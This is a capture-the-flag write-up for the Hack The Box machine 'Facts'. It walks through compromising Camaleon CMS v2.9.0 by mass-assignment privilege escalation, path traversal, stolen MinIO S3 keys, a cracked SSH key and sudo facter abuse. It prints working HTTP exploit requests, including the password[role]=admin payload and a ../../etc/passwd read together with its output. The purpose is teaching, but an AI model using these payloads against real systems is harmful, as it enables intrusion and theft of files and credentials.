# Facts 
 
> http://app.hackthebox.com/machines/Facts

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/887567be-c235-45ca-aa8f-6b9636355322" />

 
## Table of Contents
 
* [About](#about)
* [References](#references)
* [Reconnaissance](#reconnaissance)
* [Camaleon CMS](#camaleon-cms)
* [CVE-2025-2304](#cve-2025-2304)
    * [Exploitation: Manual](#exploitation---manual)
    * [Exploitation: Automated](#exploitation---automated)
* [Initial Access](#initial-access)
* [Privilege Escalation](#privilege-escalation)
* [Conclusion](#conclusion)
 
## About

Facts was an Easy Linux machine running Camaleon CMS v2.9.0, a Ruby-based content management system. The challenge revolves around exploiting two vulnerabilities in the CMS, including a mass assignment vulnerability (CVE-2025-2304) to escalate user privileges to administrator, and a path traversal vulnerability (CVE-2024-46987) to read arbitrary files on the server. Access to the admin panel revealed AWS S3 credentials for a MinIO object storage service, which contained SSH private keys. Privilege escalation was achieved by exploiting sudo permissions to run the `facter` binary with a custom Ruby script, ultimately granting root access.

## References

- [Camaleon CMS](https://camaleon.website/)
- [CVE-2025-2304](https://www.tenable.com/security/research/tra-2025-09)
- [CVE-2024-46987](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/)
- [GTFOBins: Facter](https://gtfobins.org/gtfobins/facter/)
- [GitHub/minio: MinIO](https://github.com/minio/minio)
- [rubygems.org: puma 7.0.1](https://rubygems.org/gems/puma/versions/7.0.1)
- [GitHub/puppetlabs: facter](https://github.com/puppetlabs/facter)
- [GitHub Advisories: Camaleon CMS](https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS/)
- [AWS User Guide: Access Management](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-management.html)

## Reconnaissance

Initial port scanning showed the following ports open:

- __22/tcp__: OpenSSH 9.9p1 Ubuntu
- __80/tcp__: nginx 1.26.3
- __54321/tcp__: Golang net/http server (__MinIO__)

<img width="1901" height="741" alt="0" src="https://github.com/user-attachments/assets/dcc7f91c-6397-4c51-820c-1057126eca03" />

<br>

Visiting http://facts.htb:80/ shows a website that displays _[trivia](https://en.wikipedia.org/wiki/Trivia)_. It is mostly static template HTML/CSS. The only field accepting input was `http://facts.htb:80/search?q=<keyword>`, which I tried fuzzing, but since it didn't yield any results, I continued enumerating the target for more information.

<img width="1919" height="971" alt="1" src="https://github.com/user-attachments/assets/d0fe4b00-bf22-4c6f-983d-e1ae309b4e5a" />

## Camaleon CMS

_Gobuster_ with a common wordlist identified the route `/admin/login`, which allowed me to create an account and access the dashboard. This revealed the _Content Management System_ in use to be [Camaleon v2.9.0](https://camaleon.website).

When registering on the website, the CMS set me up with a _Client_ Role account, meaning that I had limited access and could only see the welcome message being displayed on the dashboard.

A quick description of _Roles_ in _Camaleon CMS_:

| Role | Description | Capabilities |
|---|---|---|
| Administrator | Full access to all features and settings |Manage users, settings, content, and plugins
| Editor | Can create and manage content |Edit, publish, and delete content
| Client | Limited access, primarily for viewing content | View content |

<img width="1918" height="970" alt="2" src="https://github.com/user-attachments/assets/44c36eab-f982-4985-b387-e90c9d5cac57" />

## CVE-2025-2304

At this point it is important to note the __version__ being used here. __v2.9.0__ is susceptible to CVE-2025-2304, which allowed me to escalate my privileges by abusing _Mass Assignment_ in an _AJAX_ request.

From [Tenable Research](https://www.tenable.com/security/research/tra-2025-09):

_"A Privilege Escalation through a Mass Assignment exists in Camaleon CMS. When a user wishes to change his password, the `updated_ajax` method of the UsersController is called."_

```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

_The vulnerability stems from the use of the dangerous permit! method, which allows all parameters to pass through without any filtering._

_An attacker can exploit this vulnerability by submitting a request with an extra parameter that includes the role attribute allowing a user with limited privileges to become an administrator."_

<br>

Knowing this, I could send a crafted HTTP request to the server and change my account role to __Administrator__. This can be achieved manually or with an [automated Python script](https://github.com/Alien0ne/CVE-2025-2304).

<img width="1919" height="970" alt="4" src="https://github.com/user-attachments/assets/2019cbaf-27f7-44bf-9006-172f9276468c" />

### Exploitation: Manual

Create an account, grab necessary tokens/cookies, and send the Mass Assignment payload (__&password[role]=admin__) directly to the `/admin/users/6/updated_ajax` endpoint.

```HTTP
POST /admin/users/<id>/updated_ajax HTTP/1.1
Host: facts.htb
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
X-CSRF-Token: <csrf-token>
X-Requested-With: XMLHttpRequest
Cookie: _factsapp_session=<session>; auth_token=<token>
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

_method=patch&authenticity_token=<csrf-token>&password[password]=<string>&password[password_confirmation]=<string>&password[role]=admin
```

__Elevate to admin:__

<img width="1549" height="487" alt="3-5" src="https://github.com/user-attachments/assets/018dcab2-75ae-4d56-a5be-b90af95a4667" />

__Extract AWS S3 keys:__

<img width="1547" height="669" alt="3-7" src="https://github.com/user-attachments/assets/bc650bc4-91f3-472a-bd5f-4362a1029200" />

### Exploitation: Automated

- https://github.com/Alien0ne/CVE-2025-2304

We can use this Python script by _Alien0ne_ to elevate our privileges and extract the [__AWS S3 access/secret keys__](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-management.html) from the admin settings page.

<img width="1365" height="310" alt="3" src="https://github.com/user-attachments/assets/bf7e35f4-cb07-4fe2-bc64-df290f6d320a" />

## Initial Access

Now that I had the __access/secret__ keys, it was time to turn my attention to the [MinIO](https://github.com/minio/minio) service running on port _54321_.

From [GitHub/minio](https://github.com/minio/minio):

_"MinIO is a high-performance, S3-compatible object storage solution released under the GNU AGPL v3.0 license. Designed for speed and scalability, it powers AI/ML, analytics, and data-intensive workloads with industry-leading performance."_

- _S3 API Compatible: Seamless integration with existing S3 tools_
- _Built for AI & Analytics: Optimized for large-scale data pipelines_
- _High Performance: Ideal for demanding storage workloads._

After configuring the _AWS CLI_, I could list two buckets under MinIO:

- __internal__: A standard Linux home directory
- __randomfacts__: The web application assets 

<img width="1191" height="435" alt="5" src="https://github.com/user-attachments/assets/6158c04f-5239-490f-88c1-9b5adc4ce9b3" />

Notably, there was a __.ssh/__ directory present with a private key in ed25519 format and an __authorized_keys__ file. Despite having access to its home directory, I didn't have the _actual_ username to log in via SSH at the time.

That's why I leveraged yet [another CVE](https://github.com/Goultarde/CVE-2024-46987) present in _Camaleon v2.9.0_: [CVE-2024-46987](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/).

From the [GitHub Advisory](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c):

_"A path traversal vulnerability accessible via MediaController's download_private_file method allows authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions)."_

In the [download_private_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L28) method:

```ruby
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  send_file file, disposition: 'inline'
end
```

_"The file parameter is passed to the [fetch_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L27) method of the CamaleonCmsLocalUploader class (when files are uploaded locally):"_

```ruby
def fetch_file(file_name)
  raise ActionController::RoutingError, 'File not found' unless file_exists?(file_name)

  file_name
end
```

_"If the file exists it's passed back to the download_private_file method where the file is sent to the user via [send_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L33-L34)."_

This can be achieved manually by sending the following HTTP request to `/admin/media/download_private_file?file=<file_name>`:

```http
GET /admin/media/download_private_file?file=../../../../../../../../../../etc/passwd HTTP/1.1
Host: facts.htb
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: <cookie>; auth_token=<token>

---

HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Fri, 03 Apr 2026 04:09:21 GMT
Content-Type: application/octet-stream
Content-Length: 1809
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 425a582c-42f7-47df-9809-9047ac414dac
x-runtime: 0.048329

root:x:0:0:root:/root:/bin/bash
[...]
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false

```

<br>

As a result, we can see that the _passwd_ file reveals two users with active shells on the machine: `trivia` and `william`.

<img width="1235" height="257" alt="6" src="https://github.com/user-attachments/assets/7288214d-ec8f-486d-b0e6-5ed16217e813" />

I already had an SSH private key, and the obvious choice was `trivia` since it correlates with the web application (facts). Since the private key was password-protected, I had to convert it to a format compatible with _John the Ripper_. Cracking its hash revealed the password to be `dragonballz`, effectively granting me access to the machine.

<img width="967" height="307" alt="7" src="https://github.com/user-attachments/assets/9d799b4b-1282-416a-b4b5-5e6396035f39" />
<img width="1917" height="587" alt="8" src="https://github.com/user-attachments/assets/8d535f44-7eab-48ab-99a2-eb420ee1f6fd" />

## Privilege Escalation

After logging in, I checked for listening services that weren't visible before. This showed __puma 7.0.1__ which was the Camaleon CMS backend running internally.

<img width="1181" height="401" alt="9" src="https://github.com/user-attachments/assets/3590ef6c-e826-4670-9b70-12f228167d10" />

Listing _sudo privileges_ showed the ability for `trivia` to run __/usr/bin/facter__ as _All_ with _NoPasswd_.

```
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:

Sudoers entry: /etc/sudoers
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/bin/facter
```

From [Github/puppetlabs](https://github.com/puppetlabs/facter):

_"Facter is a command-line tool that gathers basic facts about nodes (systems) such as hardware details, network settings, OS type and version, and more. These facts are made available as variables in your Puppet manifests and can be used to inform conditional expressions in Puppet."_

If we check the _help_ section for facter, we can see that it accepts custom directories with the __--custom-dir__ flag. This essentially allows us to put any Ruby code inside a directory and pass that to the _facter_ command line, and most importantly, we can run it as root.
<img width="1530" height="705" alt="10" src="https://github.com/user-attachments/assets/ab02e960-66d0-4736-a72e-acf7c401ac56" />

To escalate to root, I created a Ruby script that executes a reverse shell.

<img width="1105" height="416" alt="11" src="https://github.com/user-attachments/assets/6c28091d-f8f1-4d8c-8015-ec48ebb6116e" />

## Conclusion

The Facts machine demonstrated a modern web application attack chain exploiting multiple CVEs in Camaleon CMS. The key lessons learned from this machine included:

- **Mass assignment vulnerability was critical**: The use of `permit!` in Ruby on Rails allowed unprivileged users to escalate to administrator by injecting additional parameters into password change requests

- **Path traversal enabled information disclosure**: CVE-2024-46987 in Camaleon CMS allowed authenticated users to read arbitrary files on the system, exposing usernames and SSH key locations

- **Cloud storage misconfigurations exposed credentials**: The MinIO S3-compatible storage service contained sensitive SSH private keys that should have been protected with stricter access controls

- **Sudo permissions on scripting interpreters provided easy privilege escalation**: The ability to run `facter` with the `--custom-dir` flag as root allowed execution of arbitrary Ruby code, demonstrating the dangers of granting sudo access to tools that can load custom scripts
